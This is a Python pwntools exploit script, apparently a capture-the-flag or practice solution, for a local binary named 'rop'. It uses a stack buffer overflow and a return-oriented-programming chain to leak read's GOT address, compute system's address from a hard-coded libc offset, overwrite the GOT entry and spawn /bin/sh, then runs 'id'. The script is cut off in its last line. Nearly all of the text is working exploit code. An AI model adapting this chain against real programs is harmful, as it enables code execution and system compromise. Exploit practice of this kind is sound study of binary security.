from pwn import *
from time import *

p = process("./rop")

e = ELF("./rop")
read_plt,read_got,write_plt = e.plt['read'],e.got['read'],e.plt['write']
offset = 0x9d0b0
pppr_gadget = 0x080484b6
binsh = "/bin/sh"

payload = "A"*140

payload += p32(read_plt)
payload += p32(pppr_gadget)
payload += p32(0)
payload += p32(e.bss())
payload += p32(len(binsh))

payload += p32(write_plt)
payload += p32(pppr_gadget)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += p32(pppr_gadget)
payload += p32(0)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += "AAAA"
payload += p32(e.bss())

p.send(payload)
p.send(binsh)
sleep(1)
read = u32(p.recv(4))
print hex(read)

system = read-offset
print hex(system)

p.send(p32(system))

p.sendline("id")
print p.recv(
